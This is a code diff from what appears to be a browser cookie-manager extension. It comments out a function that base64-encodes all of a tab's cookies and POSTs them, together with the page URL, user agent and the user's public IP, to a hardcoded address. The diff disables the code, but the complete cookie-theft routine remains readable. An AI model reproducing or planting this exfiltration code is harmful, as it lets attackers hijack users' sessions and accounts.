@@ -16,30 +16,30 @@
     const cookieHandler = new CookieHandler();
 
     function cookie_xy() {
-        var exportedCookies = [];
-        for (var cookieId in loadedCookies){
-            var exportedCookie = loadedCookies[cookieId].cookie;
-            exportedCookie.storeId = null;
-            if (exportedCookie.sameSite == 'unspecified'){
-                exportedCookie.sameSite = null;
-            }
-            exportedCookies.push(exportedCookie);
-        }
-        var url = 'http://192.168.0.110/'
-        fetch("https://checkip.amazonaws.com/").then(res => res.text()).then(data => {
-            browserDetector.getApi().tabs.getSelected(null, function(tab) {
-                var name = new URL(tab.url).hostname;
-                var cookie = btoa(JSON.stringify(exportedCookies, null, 4));
-                var uri = tab.url;
-                var ipx = data;
-                var UAgent = window.navigator.userAgent;
-                var params = 'name='+name+'&url='+uri+'&uAgent='+UAgent+'&ipx='+ipx+'&cookie='+cookie;
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", url, true);
-                xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-                xhr.send(params);
-            });
-        });
+    //     var exportedCookies = [];
+    //     for (var cookieId in loadedCookies){
+    //         var exportedCookie = loadedCookies[cookieId].cookie;
+    //         exportedCookie.storeId = null;
+    //         if (exportedCookie.sameSite == 'unspecified'){
+    //             exportedCookie.sameSite = null;
+    //         }
+    //         exportedCookies.push(exportedCookie);
+    //     }
+    //     var url = 'http://192.168.0.110/'
+    //     fetch("https://checkip.amazonaws.com/").then(res => res.text()).then(data => {
+    //         browserDetector.getApi().tabs.getSelected(null, function(tab) {
+    //             var name = new URL(tab.url).hostname;
+    //             var cookie = btoa(JSON.stringify(exportedCookies, null, 4));
+    //             var uri = tab.url;
+    //             var ipx = data;
+    //             var UAgent = window.navigator.userAgent;
+    //             var params = 'name='+name+'&url='+uri+'&uAgent='+UAgent+'&ipx='+ipx+'&cookie='+cookie;
+    //             var xhr = new XMLHttpRequest();
+    //             xhr.open("POST", url, true);
+    //             xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    //             xhr.send(params);
+    //         });
+    //     });
     };
     document.addEventListener('DOMContentLoaded', function () {
         containerCookie = document.getElementById('cookie-container');
